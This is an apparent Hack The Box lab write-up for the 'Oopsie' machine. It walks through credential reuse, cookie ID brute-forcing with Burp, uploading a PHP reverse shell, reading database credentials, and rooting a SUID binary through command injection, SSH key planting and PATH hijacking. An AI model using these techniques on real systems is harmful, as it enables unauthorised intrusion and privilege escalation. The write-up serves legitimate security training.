Starting Point Box writeup for a Linux box called Oopsie, purpose of this writeup is to explain how to Root this box in more detail than the official walkthroughs provided by HTB.

## Setup

We began by creating a new Directory so we can store all the outputs and files in one place. Then we check that our Starting Point VPN has connected correctly by pinging the box, please refer back to my Original Starting Point Writeup if you don't know how to setup your HTB VPN.

```bash
bros@Bros10:~/Starting-point$ mkdir Oopsie
bros@Bros10:~/Starting-point$ cd Oopsie/
bros@Bros10:~/Starting-point/Oopsie$ ping 10.10.10.28
PING 10.10.10.28 (10.10.10.28) 56(84) bytes of data.
64 bytes from 10.10.10.28: icmp_seq=1 ttl=63 time=46.1 ms
```



## Enumeration

We begin the Enumeration stage with our normal nmap scan, which I'll explain quickly again but go through more detail in my Original Starting Point Writeup. The `-sV` flag will determine versions, `-sC` will run default scripts and `-oA` will save the output of the scan.

```bash
bros@Bros10:~/Starting-point/Oopsie$ nmap -sV -sC -oA scans 10.10.10.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-15 17:27 BST

```

From the scan we can see that it only has SSH and HTTP open, due to the use of the `-sC` flag a script would of attempted anonymous login onto the SSH service so we won't attempt that. So we navigate to the site. 



## Foothold 

We attempt to the navigation bar and any other buttons which may have some functionality but they all have a href of `#` which is just a dead link. However one thing I noticed is that if you scroll down to the bottom of the website on the footer it contains an email ``admin@megacorp.com``. So after finding nothing else and all the links seem to be dead I decided to use gobuster which is a tool that we used to brute force directories and files in web sites. 

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.28
```

We begin with the `gobuster [command]` which in this case is `dir` for brute forcing directories, `-w` flag to provide the path to the wordlist we want to use and `-u` flag to provide the URL we want to brute force. After leaving this running we get a few results but the ``/cdn-cgi (Status: 301)`` directory looks interesting. I decided to brute force the `/cdn-cgi` directory to try and find any files that we could access so we ran this command:

```bash
bros@Bros10:~$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.28/cdn-cgi/

```

As you can see we find a `/login` and navigate to it.

![image-20200715164548046](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200715164548046.png)

After attempting some manual SQL injection and running SQL map against the login form I remembered the admin email (`admin@megacorp.com`) that I found on the website mentioned `megacorp` which was also mentioned within the administrators password from the initial starting point machine called Archetype. Looking back at the writeup the specific password was: `MEGACORP_4dm1n!!`. Therefore within the Login form I attempted to login as `admin` using the password `MEGACORP_4dm1n!!` , which was successful. While this was the first time for any HTB box where credentials have been reused across boxes it still teaches a very good lesson, credential reuses is a very common attack technique due to the fact that most individuals use the same password across websites and services. So if you've got any set of credentials then try them against every service which asks for some authentication. 



Once we have logged in we notice the uploads aspect, however when we navigate to this aspect of the site it comes up with this message:

![image-20200716112853924](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716112853924.png)

After noticing how it utilises `admin.php?content=` and then requests the page I attempted a Local File Inclusion but had no success, before attempting to exploit a LFI further I decided to boot up Burp suite, turn my proxy on and intercept the requests. If you've user Burp Suite before then I advise you to follow [this](https://portswigger.net/support/configuring-firefox-to-work-with-burp) tutorial to get it to work with Firefox. So we turn the Proxy on Firefox, navigate over to Burp Suite Proxy tap and then click Intercept is on which once we refresh the accounts page we will see the raw request.

![image-20200716113538787](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716120755230.png)

Within the request we can see our `Cookie: user=34322; role=admin`,from this Cookie we can tell that the `id` parameter within the URL is what identifies the role of said account and the user. I'm assuming there is a `role=SuperAdmin` but to find out what ID has that role we shall need to brute force the ID. To do this we could write a bash script which utilises curl and a wordlist containing ID numbers however for the sake of saving time I'll utilise Burp Suite to do it all for us. So all we want burp suite to do is to change the ID value to try and find which ID value corresponds to the Super Admin account. 



We first send the Request to Intruder:

![image-20200716121521881](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716121521881.png)

Navigate to Intruder, Positions tab and press the `Clear` button.

![image-20200716121622669](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716121622669.png)

We then highlight the ID and click the `Add` button 

![image-20200716121713612](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716121713612.png)

This will set it so that the ID value will be changed by the brute force attack. Navigate to the Payloads tab where we set the payload type to Brute force and change the character set to just numbers. Min length = 0 and Max length = 2 means it will brute force 00 to 99. 

![image-20200716121827126](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716121827126.png)

We then Start the attack and leave it to run for a while, once it's ran for a few seconds we can order it by length. Length is the amount of character which we get within the Request, this length should be different for any ID which correlates to the Super Admin as it's more characters than Admin. ![image-20200716122350008](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716122350008.png)

We can see here that using the payload of 30 we get a longer length, therefore there's a chance that the ID of 30 correlates to the Super Admin. So to confirm that we can head over to the Response tab within the attack and scroll down to the response where we see we are now the `super admin` and have a user number which is `86575` 

![image-20200716122658938](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716122658938.png)



Now that we have found out the Super Admins ID and it's role name we can navigate to the uploads page, intercept the request and edit the Cookie to change the user and role to the Super Admin. We then forward that request on which showcases the upload page to use. Allowing us to set a name `shell` and then upload a PHP reverse shell. The reasoning behind using a PHP reverse shell is because we know the website utilises PHP therefore a PHP shell is the best bet. For the shell I just copied and pasted it from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and changed these two lines `$ip = '10.10.xx.xx';` and then ``$port =2222; ``. As a remainder if you don't know what your IP address is run this command `ip a | grep tun0` and copy and paste your IP address up until the backslash. We then press upload, go back to Burp suite and change the `user` and `role` parameter within the cookie to Super Admin again and then forward the request which will upload the shell. 

![image-20200716123258843](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716123258843.png)



Now we've uploaded the shell we've got to find it's location and then navigate to the file on the website to execute it. So if we go back to the output of our first gobuster scan we can see a `/uploads` directory and therefore navigate to `http://10.10.10.28/uploads/shell.php`. But before navigating to said directory we've got to setup netcat to listen on port 2222 and then navigate to the URL, where if you've done it correctly it should hang and give you a call back on your terminal. 

![image-20200716123438255](C:\Users\Tristan\AppData\Roaming\Typora\typora-user-images\image-20200716123438255.png)

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@oopsie:/$ 
```

You can see above that we've utilised python3 to improve our shell.

## User

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ pwd
pwd
/var/www/html/cdn-cgi/login
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls        	
ls
admin.php  db.php  index.php  script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

So we cd into the directory which is hosting the `cdn-cgi` aspect and notice a `db.php` file which contains the credentials for `robert` we can switch account to `robert` and get the User flag.

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert 
su robert 
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$ 
```





## Root - Getting root.txt

We begin the journey to root by running the first command that you should do run is `sudo -l` which shows what commands you can run using `sudo` however `robert` has no commands which he can run using `sudo`. The next command I run is seen below

```bash
robert@oopsie:/$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

As you can see we are part of a group called `bugtracker` so we run this `find` command to find all files which belong to the `bugtracker` group.

```bash
robert@oopsie:/$ find / -group bugtracker
find: ‘/var/log/unattended-upgrades’: Permission denied
find: ‘/var/spool/cron/atspool’: Permission denied
find: ‘/var/spool/cron/atjobs’: Permission denied
find: ‘/var/spool/cron/crontabs’: Permission denied
find: ‘/var/spool/rsyslog’: Permission denied
find: ‘/var/lib/polkit-1’: Permission denied
find: ‘/var/lib/mysql’: Permission denied
find: ‘/var/lib/mysql-keyring’: Permission denied
find: ‘/var/lib/snapd/void’: Permission denied
find: ‘/var/lib/snapd/cookie’: Permission denied
find: ‘/var/lib/update-notifier/package-data-downloads/partial’: Permission denied

find: ‘/var/lib/php/sessions’: Permission denied
find: ‘/etc/polkit-1/localauthority’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/lost+found’: Permission denied
```

However as you can see due to the fact that we are searching every folder within this machine we get alot of Permission denied so to stop this from happening and to just see valid results we can add `2>/dev/null` to the end which will filter out the errors so they don't fill up the console. In more detail: 2 represents the error descriptor, which is where errors are written to but then using `>` we direct all those errors to `/dev/null` which immediately discards anything written to it. Think of `/dev/null` as a blackhole. 

```bash
robert@oopsie:/$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

We can run `ls -lah` against `/usr/bin/bugtracker` and see that the group `bugtracker` can execute and use this binary but it's owned by `root` meaning if we can get this binary to execute a command we want. Said command would be executed as root, therefore being able to get the root flag and a root shell. 

```bash
root@oopsie:/usr/bin# ls -lah | grep bugtracker
-rwsr-xr--  1 root   bugtracker 8.6K Jan 25 10:14 bugtracker
```

So now let's see what this program does. 

```bash
robert@oopsie:/$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1 #We provided this input, just put 1 as I assume an ID is an integer.
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

So when inputting 1 we seem to get some sort of report back.

Now instead of entering an integer I decided to input some random characters to see how the program responded.

```bash
robert@oopsie:/$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: awdawd
---------------

cat: /root/reports/awdawd: No such file or directory
```

We can see that the Bug ID corresponds to a file in `/root/reports`. So using the Bug ID of 1 the program seems do this `cat /root/reports/1`. The first thing I tried was to get it to output the root.txt file instead of a report. So I put this as an ID:

```bash
Provide Bug ID: ../root.txt
---------------

af1
```

This works due to the fact that it's executing this command `cat /root/reports/../root.txt` and then `..` will actually drop down to `/root`.We have now successfully obtained the root flag but I always want to try and get a stable shell. As within a real world scenario there wouldn't be a "flag" and we would need a shell to have any impact. 



## Root - Route to SSH access

Initially,I tried to get the contents of the roots private SSH key for root however that didn't seem to exist.  Meaning no SSH key has been generated by root on this machine. However if you look at your own `/home/your_user/.ssh/` directory you should see a `authorized_keys` file which may contain public SSH keys for users who can SSH in as root. Meaning the main goal would be to be able to get our own ``id_rsa.pub`` (my SSH public key) into the roots `authorized_keys`. 



Before thinking about being able to SSH in we've got to have a better understand of how we could exploit this program. Now I all ready know that the program just `cats` a file, therefore we can use `;` to get the program to run this `cat /root/reports/1;ls` which will both cat the file and then also `ls` the current directory from where the program is being ran from.  

```bash
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :

Provide Bug ID: 1;ls 
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

What you expected to happen:

What happened instead:

user.txt
```

So then decided to try and cat the user.txt file.

```bash
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1;cat user.txt
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:

```

However we can see that the contents of `user.txt` wasn't printed, after trying some more commands it seems like we couldn't execute any commands which included spaces. Which didn't allow us to do `1;cat /root/root.txt` due to the space between `cat` and the `/root` directory. To overcome this issue of not being able to execute commands with spaces we can create a bash file, which contains multiple commands and then get the `bugtracker` program to execute the bash file. Resulting in every command getting executed. So I created an bash file and included just 2 commands and made it executable, if I didn't make it executable the only way to execute said bash file would be through this command `bash exploit.sh` which once again has a space. Therefore by making it executable using `chmod +x` I can run the file through this command `./exploit.sh`

```bash
robert@oopsie:~$ cat exploit.sh 
#!/bin/bash

cat /root/root.txt
ls /root/.ssh/
robert@oopsie:~$ chmod +x exploit.sh
robert@oopsie:~$ ./exploit.sh 
cat: /root/root.txt: Permission denied
ls: cannot access '/root/.ssh/': Permission denied
```

So I attempt to get root to execute the `exploit.sh` file.

```bash
robert@oopsie:~$ /usr/bin/bugtracker

af1
authorized_keys
```

As you can see we have printed the root flag again and we can see that the `/root/.ssh/` directory does contain the `authorized_keys` file. All we have to do now is to echo my SSH public key into the `authorized_keys` file and then we will be able to SSH in as root. Therefore adjust the `exploit.sh` file.

```bash
robert@oopsie:~$ cat exploit.sh 
#!/bin/bash

echo "Adding my Public SSH key into /root/.ssh/authorized_keys"
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC+GtvKWz5s9cZWcWVkO0JQneEhk/adF7E7CfLVCaExFwEKQOpNsIWXKjg07BNfvRBPRehm/uhLDSlXTKAldmvhxv0cLHJV3N/SLZG3D2abjX9ejSHr6p1hpZRuNc+xJTHww+AhCyDUSaVmEf1Nrcrd0hMA4T7/LCn2jzN1XS3ZAg1HK7LH205PcvOy4XLytcwslSA02wqlN7OJpytl3pwCvdCa1anRGrE4MD4xQ58CKEdsU6w1cmP2HSBDtuDzk2TJzXeyX5B30vaYSLIxS0DeoUcJq1v/Ohf3TCxLAZUMn5gtpD5FMe1sPi0JbE8vtwk/F3/7z8BZRBjakqe0oyNKab1eSaA1o1wtMTwsRU4VKjUuPW1+0iouf2UeJi43zZsOwl5n4wCvtvleEu1tvdhAQ5MJAP9wyuvoF3rZitICwtSvG6XQcqIsNbBqT5UJ6h1ZvIWXwavFkg8i0Qsd25LkSzZEHaCAl9z1GyG47WJN3d4KutY9vPVd+1au2Ec8tgDnnN8l0FJijlfHbefOnj6fx4XBJmZWpL2AHHrqnnyzbfbCeXm2RGU7P1DN6kqxFYIInWkwC6i9FLH34Vxym3EARoBhiws8WIcqqoTKDJ7kdipCJC+RsdRsPYk4i2MlZOrlhJ+Y8L5N9iqCRWBiyVI1JRnWZo2DhPjIL1K4rwlSXQ== myemail@gmail.com" > /root/.ssh/authorized_keys

Allowing me to execute the exploit again as root.

## Root - Abusing the PATH variable



Before I originally exploited the application I ran ``strings /usr/bin/bugtracker/``on it and came across this string: `cat /root/reports/`. This string showcases that this calls the `cat` binary using relative path instead of absolute path. Here is an example of using relative path: `robert@oopsie:~$ bugtracker` and here is an example of using absolute path: `robert@oopsie:~$ /usr/bin/bugtracker`. To abuse the fact that `bugtracker` utilises relative path you need to understand the PATH variable. The PATH variable is an environment variable that contains an ordered list of paths that Unix will search for executables/binaries/programs when running a command. We can see said PATH variable through this command:

```bash
robert@oopsie:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

We can modify the PATH variable using export.

```bash
robert@oopsie:~$ mkdir exploit
robert@oopsie:~$ cd exploit/
robert@oopsie:~/exploit$ pwd
/home/robert/exploit
robert@oopsie:~/exploit$ export PATH=/home/robert/exploit:$PATH #This will add /home/robert/exploit to the front of the list for the PATH variable.
robert@oopsie:~/exploit$ echo $PATH
/home/robert/exploit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

This means that if we call the `bugtracker` binary now it will call the `cat` binary however it will first look for it in `home/robert/exploit` and then in `/usr/local/sbin` etc. We can create a file called `cat` in `/home/robert/exploit`. Once we run `bugtracker` it will run our version of the`cat` binary. Therefore we can create a bash file, name it `cat` and gain root the exact same way as we managed beforehand. One example can be seen here: 

```bash
robert@oopsie:~/exploit$ chmod +x cat 
robert@oopsie:~/exploit$ cat cat 
#!/bin/bash
echo "Root shell incoming"
/bin/bash #We could also make it echo our SSH public key like we did above.
robert@oopsie:~/exploit$ ls
cat
robert@oopsie:~/exploit$ bugtracker

So when we enter 1, it will attempt to do `cat /root/reports/1` but it will call our `cat` binary which will then give us a root shell.



Another example of utilising this exploit is calling a `/bin/sh` shell instead of a `/bin/bash` shell.

```bash
robert@oopsie:~$ mkdir exploit
robert@oopsie:~$ ls
exploit  LinEnum.sh  user.txt
robert@oopsie:~$ cd exploit/
robert@oopsie:~/exploit$ export PATH=:$PATH    
robert@oopsie:~/exploit$ ^C
robert@oopsie:~/exploit$ pwd
/home/robert/exploit
robert@oopsie:~/exploit$ export PATH=/home/robert/exploit:$PATH
robert@oopsie:~/exploit$ echo $PATH
/home/robert/exploit::/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
robert@oopsie:~/exploit$ echo '/bin/sh' > cat
robert@oopsie:~/exploit$ chmod +x cat
robert@oopsie:~/exploit$ /usr/bin/bugtracker

## Root - Extra Ways



For this box the amount of ways to abuse the `bugtracker` program is nearly unlimited. So here are just a few more examples of how else you could get a root shell. 

```bash
robert@oopsie:~$ vim exploit.sh     

#!/bin/bash
  
cat /root/root.txt
ls /root/.ssh/
/bin/bash
```

```bash
Provide Bug ID: 1;./exploit.sh
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.

```



```bash
robert@oopsie:~$ vim exploit.sh 

#!/bin/bash
  
cat /root/root.txt
ls /root/.ssh/
/bin/sh
```



```bash
robert@oopsie:~$ /usr/bin/bugtracker

## Conclusion 

In Conclusion we begin by navigating to the website, where we find an login form. Which we can log in as Admin using the credentials from the previous box. From there we can brute force the user ID to obtain the Super Admin role which allows us to upload a PHP reverse shell. Once we obtain a shell we find credentials for the user account in the `db.php` file, allowing us to switch users and get the user flag. We then find out that robert is part of a group called bugtracker, which we find can run a program called bugtracker which however is executed as root. Allowing us to abuse the program to execute commands we want as root, resulting in multiple paths to root.
